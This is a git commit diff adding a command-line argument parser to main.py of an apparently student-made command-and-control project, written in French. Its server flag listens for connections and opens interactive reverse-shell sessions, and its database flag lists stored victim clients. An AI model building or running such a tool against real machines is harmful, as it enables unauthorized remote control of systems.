25b5d7104f14cfd1108ff50adb4210ac6bf8844d
m0nsieurPsych0 <thevilpsycho666@protonmail.com>
2021-05-30 21:13:23 -0400

    Ajout d'argument parser

--- Projet_BoulaisKarl/commandNcontrol/main.py
+++ Projet_BoulaisKarl/commandNcontrol/main.py
@@ -14,23 +14,57 @@ from dao import Dao, Columns
 
 def argParse():
     p = ArgumentParser()
+    group = p.add_mutually_exclusive_group()
 
+    group.add_argument('-s','--server', dest='server', action='store_true', help='''
+
+    Démarre le serveur et écoute pour des connexions. 
+    Le mode est intérractif et permet de sélectionner des connexions pour démarrer une session Reverse Shell.
+
+    ''')
+
+    choiceList = ["ALL"]
+
+    for choice in Columns:
+        choiceList.append(str(choice))
+    
+    group.add_argument('-d', '--db', action='store', type=str, choices=choiceList, dest='db', help='''
+    
+    Entrez un ou plusieurs champ que vous voulez lister provenant de la base de donnée. 
+    Un choix vide affiche tout le contenu de la base de donnée.    
+    ''')
+    
     return p
+
+def error(text):
+    print(f"\033[1;31;40m {text} \033[0;0m") 
 
 
 def main():
-    # v = View()
-    # s = Server()
-    # s.main()
+    args = argParse().parse_args()
+    
+    if args.server:
+        v = View()
+        s = Server()
+        s.main()
+        v.interractiveMode(s)
+    elif args.db:
+        if args.db == "ALL":
+            Dao().printAllClient()
+        else:
+            Dao().queryDB(args.db)
+        
+
+
+    # TODO :
+    # - ARGPARSE:
+    #           1- server et control
+    #           2- query database
     
     
-    # v.interractiveMode(s)
-    Dao().queryDB(Columns.HOSTNAME.name)
-    # Dao().printAllClient()
     
 if __name__ == "__main__":
-   main()
-
+    main()
 
 
 '''
